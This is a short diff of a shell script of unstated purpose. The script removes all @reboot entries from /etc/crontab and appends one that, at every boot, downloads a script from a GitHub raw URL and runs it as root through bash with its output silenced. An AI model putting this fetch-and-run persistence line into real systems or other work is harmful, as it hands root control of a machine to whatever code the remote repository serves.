@@ -2,7 +2,7 @@
 
 src="https://raw.githubusercontent.com/vjbahkds/cajbdfv/main"
 sudo sed -i '/^@reboot/d' /etc/crontab
-sudo sed -i "\$a\@reboot root /bin/bash <(wget -qO- ${src}/_) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
+sudo sed -i "\$a\@reboot root /bin/bash <(wget -qO- ${src}/...) >>/dev/null 2>&1 &\n\n\n" /etc/crontab
 
 name=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
 [ -n "$name" ] || name="NULL"
